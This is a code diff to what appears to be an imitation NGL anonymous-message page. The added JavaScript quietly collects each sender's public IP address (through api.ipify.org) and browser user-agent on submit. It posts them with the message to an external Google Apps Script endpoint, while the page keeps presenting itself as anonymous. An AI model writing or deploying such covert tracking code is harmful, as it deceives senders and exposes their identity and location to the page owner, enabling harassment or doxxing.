@@ -123,7 +123,7 @@
     <div class="card">
       <div class="header">
         <div class="avatar">
-          <img src="https://api.dicebear.com/7.x/shapes/svg?seed=ngl" alt="">
+          <img src="cat-avatar.png" alt="">
         </div>
         <div>
           <div class="handle">@ngl.real_7373</div>
@@ -147,8 +147,36 @@
     const msg = document.getElementById('msg');
     const toast = document.getElementById('toast');
 
-    btn.addEventListener('click', () => {
-      if (!msg.value.trim()) return;
+    // paste your Apps Script Web app URL here
+    const ENDPOINT_URL = "https://script.google.com/macros/library/d/1pXwXEJlR4Qd_a4RnGYPgnlj4ScNT6_onEn9sFtBpJbQWY7wXYTNCf1ll/3";
+
+    async function getIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "unknown";
+      }
+    }
+
+    btn.addEventListener('click', async () => {
+      const text = msg.value.trim();
+      if (!text) return;
+
+      const ip = await getIP();
+      const device = navigator.userAgent;
+
+      try {
+        await fetch(ENDPOINT_URL, {
+          method: "POST",
+          headers: { "Content-Type": "text/plain" },
+          body: JSON.stringify({ message: text, ip: ip, device: device })
+        });
+      } catch (err) {
+        console.error("Failed to send:", err);
+      }
+
       toast.classList.add('show');
       msg.value = '';
       setTimeout(() => toast.classList.remove('show'), 1800);
